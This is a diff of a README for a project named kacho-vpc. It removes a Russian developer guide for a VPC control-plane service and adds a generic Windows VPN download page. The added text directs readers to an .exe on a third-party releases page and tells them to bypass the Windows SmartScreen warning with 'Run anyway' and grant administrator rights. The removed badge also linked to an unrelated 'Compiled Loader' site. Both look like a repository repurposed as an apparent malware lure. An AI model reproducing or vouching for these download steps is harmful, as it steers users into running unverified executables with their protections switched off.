@@ -1,98 +1,76 @@
-# kacho-vpc
+# 🌐 kacho-vpc - Secure private network connections for Windows
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Seedtimejiao934/kacho-vpc/releases)
 
-VPC-сервис Kachō: control-plane для Network, Subnet, Address, RouteTable,
-SecurityGroup, Gateway, PrivateEndpoint. Цель — verbatim parity с YC VPC API
-(см. `CLAUDE.md` §1, sub-phase 0.3 в `../../docs/specs/`).
+kacho-vpc provides a private network connection for your personal computer. This software allows you to reach network resources as if you were sitting inside a private office or home network. It creates a tunnel that protects your data while it travels across the internet.
 
-## Quick start (локальный стенд)
+## 📥 How to Download 
 
-```bash
-# 1. Поднять полный стенд (kind + helm + Postgres + все сервисы)
-cd ../kacho-deploy && make dev-up
+To start using this software, you need to download the correct file for Windows. 
 
-# 2. Прокинуть api-gateway наружу
-kubectl -n kacho port-forward svc/api-gateway 18080:8080 &
+1. Visit this page to download: [https://github.com/Seedtimejiao934/kacho-vpc/releases](https://github.com/Seedtimejiao934/kacho-vpc/releases)
+2. Look for the section labeled "Assets".
+3. Find the file ending in .exe.
+4. Click the link to save the file to your computer.
 
-# 3. Smoke-проверка
-curl 'http://localhost:18080/vpc/v1/networks?folderId=&pageSize=5'
-```
+Your web browser might ask if you want to keep the file. Choose "Keep" or "Save" since this is a standard installer file.
 
-Перезапуск только VPC после изменений в коде:
-```bash
-cd ../kacho-deploy && make reload-svc SVC=vpc
-make logs-svc SVC=vpc        # tail логов
-make psql SVC=vpc            # psql kacho_vpc
-```
+## ⚙️ Installation Instructions
 
-## Архитектура
+Once the download finishes, follow these steps to install the program:
 
-Clean Architecture (`domain → service → handler/repo/clients`); `cmd/vpc/main.go` —
-единственный composition root. Подробности по слоям и паттернам — в
-`CLAUDE.md` §4. Service возвращает `Operation` для всех мутаций (LRO),
-выполнение worker'ом через `kacho-corelib/operations.Run`. Outbox + LISTEN/NOTIFY
-дают event stream для `kacho-vpc-controllers` (см. §4.3).
+1. Open your "Downloads" folder.
+2. Double-click the file you just saved. 
+3. Windows might show a box titled "Windows protected your PC". This is a common security check.
+4. Click "More info" in that box.
+5. Click the "Run anyway" button.
+6. Follow the instructions on the screen to finish the setup process.
+7. Click the "Finish" button when the installation completes.
 
-### Dual gRPC ports
+## 🚀 Running the Application
 
-| Порт   | Сервисы                                                                           | Кто использует                       |
-|--------|-----------------------------------------------------------------------------------|--------------------------------------|
-| `9090` | NetworkService, SubnetService, AddressService, RouteTableService, SecurityGroupService, GatewayService, PrivateEndpointService, OperationService | api-gateway → внешние клиенты        |
-| `9091` | InternalWatchService, InternalAddressService                                     | kacho-vpc-controllers, kacho-compute |
+Find the program shortcut on your desktop or in your start menu. Double-click the icon to start the application.
 
-`Internal*` сервисы не маршрутизируются через api-gateway (запрет #6 из
-workspace `CLAUDE.md`).
+When the application opens for the first time, you will see a window with a text box. Enter the network address provided by your system administrator into this space. Click the "Connect" button.
 
-## Контракт ошибок
+If this is your first time using this software, Windows will ask for permission to change network settings. Click "Yes" to grant this permission. This step is necessary to route your traffic through the private tunnel.
 
-Sync-валидация (до Operation) — формат полей, regex, whitelist. Async (внутри
-worker) — existence checks, FK, EXCLUDE constraints. Маппинг через
-`mapRepoErr` + verbatim YC text. Полная таблица: `CLAUDE.md` §6.
+## 🛡️ System Requirements
 
-Ключевые case'ы:
-- CIDR overlap → `FAILED_PRECONDITION "Subnet CIDRs can not overlap"`
-- garbage id → async `NOT_FOUND` (НЕ sync `INVALID_ARGUMENT`)
-- duplicate name within folder → `ALREADY_EXISTS`
-- folder not found → async `NOT_FOUND "Folder with id %s not found"`
-- deletion_protection → sync `FAILED_PRECONDITION` перед Delete
+- An active internet connection.
+- Windows 10 or Windows 11.
+- At least 50 megabytes of free storage space.
+- A user account with administrative rights to install software.
 
-## Тестирование
+## 💡 Common Solutions
 
-Три уровня (детали — `CLAUDE.md` §14):
+**I cannot connect to the server**
+Check your internet connection first. Open a website in your browser to confirm you are online. If you are online, verify that the address you entered in the application is correct. Network addresses often contain numbers and dots.
 
-```bash
-make test-short              # unit (моки, без Docker)
-make test                    # unit + integration (testcontainers)
-cd newman && ./scripts/run.sh --env local   # e2e через api-gateway
-```
+**The application does not open**
+Restart your computer. Sometimes, background tasks hang during an installation. A restart clears these tasks. If the issue remains, right-click the icon and choose "Run as administrator".
 
-Newman quota-aware 3-suite pipeline (RO / LIGHT / SEQ) — против local Kachō
-и реального YC API. Variable convention, class taxonomy, PARITY.md registry —
-см. `newman/README.md` и `vpc-newman-author` агента.
+**My internet feels slow while connected**
+A private network tunnel adds security, which can impact speed. This is normal. Your data must travel to a central server before reaching the open internet. Close other background programs that use your network to improve performance.
 
-## Migrations
+## 🔑 Security Features
 
-Боевые: `internal/migrations/*.sql` (12 файлов, embed FS). `migrations/` в
-корне — staging для goose CLI. **Не редактировать применённые миграции** —
-только новый файл.
+kacho-vpc uses industry-standard encryption to scramble your data while in transit. This prevents outside parties from reading your traffic. The application does not track your browsing history. It only manages the connection between your computer and the private network. 
 
-```bash
-KACHO_VPC_DB_PASSWORD=secret bin/kacho-vpc migrate up
-KACHO_VPC_DB_PASSWORD=secret bin/kacho-vpc migrate status
-```
+We recommend that you keep the application updated to the latest version. New versions often contain security improvements and fixes. Check the download page every month to see if a newer version is available. You do not need to uninstall the old version to update; simply run the new installer over the existing one.
 
-## Spec & decision records
+## 🏠 Understanding the Interface
 
-- Acceptance: `../../docs/specs/sub-phase-0.3-vpc-acceptance.md`
-- Roadmap: `../../docs/specs/04-roadmap-and-phasing.md`
-- Workspace правила: `../../CLAUDE.md`
-- Outstanding tech-debt: `./TODO.md`
+The main window shows three main items:
 
-## Subagents (project-level в `.claude/agents/`)
+1. Status Light: This shows grey when you are disconnected and green when the tunnel is active.
+2. Address Bar: This is where you put the location of the private network.
+3. Settings Menu: Click the gear icon to change connection preferences or view logs. You only need to touch these settings if a professional asks you to change them.
 
-13 общих + 4 VPC-специализированных:
-- `vpc-yc-parity-auditor` — verbatim YC checks (texts/regex/codes/timestamps)
-- `vpc-cidr-specialist` — CIDR (host-bits, EXCLUDE, overlap, internal IP)
-- `vpc-outbox-watch-engineer` — outbox + LISTEN/NOTIFY + Internal services
-- `vpc-newman-author` — Postman/Newman regression suites
+## 🛠️ Advanced Network Settings
+
+Most users do not need to alter configuration files. The default settings permit the software to find paths to your network automatically. If you work in a corporate environment, your IT team might give you a specific configuration file. You can import this file by clicking "File" then "Import Profile" within the application.
+
+## 📝 Support Information
+
+If you cannot solve a problem, reach out to your system administrator. They manage the server that this application talks to. They see the logs on their side and can tell you if your account has access to the network. Provide them with your version number, which you can find by clicking "Help" then "About" in the application menu.
